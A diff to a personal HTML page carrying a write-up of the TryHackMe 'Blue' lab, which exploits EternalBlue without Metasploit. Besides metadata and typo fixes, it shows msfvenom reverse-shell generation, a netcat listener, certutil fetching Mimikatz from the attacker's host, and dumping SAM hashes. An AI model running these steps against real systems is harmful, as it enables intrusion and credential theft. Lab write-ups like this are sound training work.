@@ -3,11 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CTF Write-up: Blue</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="TryHackMe Blue write-up — EternalBlue (CVE-2017-0143) exploited without Metasploit; Mimikatz SAM dump and JtR cracking.">
+    <meta name="author" content="Andrew Hardiman">
+    <title>Andrew Hardiman — CTF Write-up: Blue</title>
+    <!-- Security-related meta tags -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; img-src 'self' data:;">
+    <meta name="referrer" content="no-referrer">
+    <meta name="robots" content="index, follow">
+    <!-- Link to external stylesheet -->
     <link rel="stylesheet" href="/css/styles.css">
-
     <!-- Favicon -->
     <link rel="icon" href="/img/logo.png" type="image/png">
+    <!-- Open Graph for better sharing on social media -->
+    <meta property="og:title" content="Andrew Hardiman — CTF Write-up: Blue">
+    <meta property="og:description" content="TryHackMe Blue write-up — EternalBlue (CVE-2017-0143) exploited without Metasploit; Mimikatz SAM dump and JtR cracking.">
+    <meta property="og:image" content="https://andrew-hardiman.github.io/img/logo.png">
+    <meta property="og:url" content="https://andrew-hardiman.github.io/writeups/thm_blue.html">
+    <meta property="og:type" content="article">
+    <!-- Twitter Card for better sharing on Twitter -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Andrew Hardiman — CTF Write-up: Blue">
+    <meta name="twitter:description" content="TryHackMe Blue write-up — EternalBlue (CVE-2017-0143) exploited without Metasploit; Mimikatz SAM dump and JtR cracking.">
+    <meta name="twitter:image" content="https://andrew-hardiman.github.io/img/logo.png">
+    <!-- Links to JavaScript Files -->
+    <script src="/js/main.js" defer></script>
 </head>
 <body>
     <header>
@@ -19,11 +39,10 @@
                 <li class="dropdown">
                     <a href="#">CTF Write-ups</a>
                     <ul class="dropdown-content">
-                        <li><a href="hackthebox.html">Hack the Box</a></li>
+                        <!-- <li><a href="hackthebox.html">Hack the Box</a></li> -->
                         <li><a href="/writeups/tryhackme.html">Try Hack Me</a></li>
                     </ul>
                 </li>
-                <li><a href="#contact">Contact</a></li>
             </ul>
         </nav>
     </header>
@@ -53,11 +72,11 @@
                 <pre><code>case@local:~$ nmap -n -v -sS -oX blue_output.xml 10.10.34.160</code></pre>
                 <p>Here is a truncated snapshot of our scan output.</p>
                 <img src="/writeups/img/blue_output.png" alt="/writeups/img/not_found.png">
-                <p>There is some useful stuff here. 445 (SMB) is definitely going to be our attack point, the room is called "Blue" and the preceeding learning modules have been almost exclusively referring to the EternalBlue exploit. Let us confirm our suspicions and run the nmap "vuln" scripts against port 445.</p>
+                <p>There is some useful stuff here. 445 (SMB) is definitely going to be our attack point, the room is called "Blue" and the preceding learning modules have been almost exclusively referring to the EternalBlue exploit. Let us confirm our suspicions and run the nmap "vuln" scripts against port 445.</p>
                 <pre><code>case@local:~$ nmap -n -v --script=vuln -p 445 -oX blue_script_vulns.xml 10.10.34.160</code></pre>
                 <p>Here is a truncated snapshot of our scan output.</p>
                 <img src="/writeups/img/blue_script_vulns.png" alt="/writeups/img/not_found.png">
-                <p>Our suspicions have been confirmed, this machine is indeed vulnerable to "Remote Code Execution vulnerability in Mircosoft SMBv1 servers (ms17-010)". We have the CVE ID also. A quick search in exploit-db shows a number of available exploits.</p>
+                <p>Our suspicions have been confirmed, this machine is indeed vulnerable to "Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)". We have the CVE ID also. A quick search in exploit-db shows a number of available exploits.</p>
                 <img src="/writeups/img/ms17_exploits.png" alt="/writeups/img/not_found.png">
                 <p>Anyway, as mentioned in the introduction, most write-ups for this room follow the exact same patterns, so I thought I would research EternalBlue on the internet, in order to see what I could find. I came across this GitHub repo: <a href="https://github.com/3ndG4me/AutoBlue-MS17-010">3ndG4me/AutoBlue</a>. The README states "This version of the exploit {EternalBlue} is prepared in a way where you can exploit EternalBlue WITHOUT Metasploit". This is exactly what I want to do. </p>
             </section>
@@ -73,7 +92,7 @@
                 <pre><code>case@local:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={LOCAL_IP} LPORT=444 -a x64 -f raw -o sc_x64_msf.bin</code></pre>
                 <p>Finally, we need to combine the kernel shellcode exploit binary with the reverse shell binary, again this would have been done by the "shell_prep.sh", but manually is easy too.</p>
                 <pre><code>case@local:~$ cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin</code></pre>
-                <p>We now need to run the exploit. The AutoBlue repo also contains an exploit script "eternalblue_exploit7.py". This script is fairly complex, and even with five years of Web Development experience I find it diffcult to understand exactly what is going on here. As far as I can make out, the script loads the binary shellcode file we created earlier (sc_x64.bin), which is the payload, and places it into memory. The shellcode/payload will then execute, providing us with our reverse shell. First then, let us set up a listener on our local/attacking machine.</p>
+                <p>We now need to run the exploit. The AutoBlue repo also contains an exploit script "eternalblue_exploit7.py". This script is fairly complex, and even with five years of Web Development experience I find it difficult to understand exactly what is going on here. As far as I can make out, the script loads the binary shellcode file we created earlier (sc_x64.bin), which is the payload, and places it into memory. The shellcode/payload will then execute, providing us with our reverse shell. First then, let us set up a listener on our local/attacking machine.</p>
                 <pre><code>case@local:~$ sudo nc -lvnp 444</code></pre>
                 <p>We can then run the exploit.</p>
                 <pre><code>case@local:~$ python3 eternalblue_exploit7.py 10.10.34.160 sc_x64.bin</code></pre>
@@ -105,7 +124,7 @@ certutil -urlcache -split -f http://{LOCAL_IP}:8001/mimikatz.exe C:\Windows\Syst
   000000  ...
   108c00
 CertUtil: -URLCache command completed successfully.</code></pre>
-                <p>We have successfully uploaded the Mimikatz executable to our target server. We now want to extract the password hashes. We need to accesss the Security Account Manager (SAM) hive, which is the file that contains the hashed passwords of all the local user accounts. However, we have a problem, as the file will likely already be in use by another system process, and will be locked by Windows. Attempting to read the the file directly with Mimikatz will likely fail. The first step, therefore, will be to export the relevant hives/files from the Windows Registry into separate files that we can readily access with Mimikatz. </p>
+                <p>We have successfully uploaded the Mimikatz executable to our target server. We now want to extract the password hashes. We need to access the Security Account Manager (SAM) hive, which is the file that contains the hashed passwords of all the local user accounts. However, we have a problem, as the file will likely already be in use by another system process, and will be locked by Windows. Attempting to read the the file directly with Mimikatz will likely fail. The first step, therefore, will be to export the relevant hives/files from the Windows Registry into separate files that we can readily access with Mimikatz. </p>
             <pre><code>C:\Windows\System32>reg save hklm\sam c:\sam</code></pre>
             <pre><code>C:\Windows\System32>reg save hklm\system c:\system</code></pre>
             <p>Here is our output. It appears we have a problem!</p>
@@ -115,7 +134,7 @@ ERROR: A required privilege is not held by the client.</code></pre>
             <p>Fortunately for us we have uploaded the excellent post exploitation tool Mimikatz. Mimikatz has the following command <i>privilege::debug</i>. When you run this command Mimikatz attempts to grant the process <i>SeDebugPrivilege</i>, which is a Windows privilege that allows a user to debug processes owned by other users. Importantly, it includes the ability to read and write to the memory of other processes, including retrieving sensitive information such as passwords and hashes, from processes like "lsass.exe" (the Local Security Authority Subsystem), which manages user logins and authentication. </p>
             <p>Start Mimikatz.</p>
             <pre><code>C:\Windows\system32>mimikatz.exe</code></pre>
-            <p>Run the following command, in order to grant process <i>SeDebugPrivilege</i>. You should see the OK message if this is successful. Note, I had an issue here, and I fell down a rabbit hole for several hours. The issue in the end was that I had originally uploaded the 32-bit version of Mimikatz, when the target system we are actualy trying to exploit is a 64-bit system.</p>
+            <p>Run the following command, in order to grant process <i>SeDebugPrivilege</i>. You should see the OK message if this is successful. Note, I had an issue here, and I fell down a rabbit hole for several hours. The issue in the end was that I had originally uploaded the 32-bit version of Mimikatz, when the target system we are actually trying to exploit is a 64-bit system.</p>
             <pre><code>mimikatz # privilege::debug
 Privilege '20' OK</code></pre>
             <p>We can now try and export the SAM and SYSTEM hives again.</p>
@@ -185,7 +204,7 @@ flag{XXXXX}</code></pre>
     </main>
 
     <footer>
-        <p>&copy; 2024 Andrew Hardiman. All rights reserved.</p>
+        <p>&copy; <span id="year">2026</span> Andrew Hardiman. All rights reserved.</p>
     </footer>
 </body>
 </html>
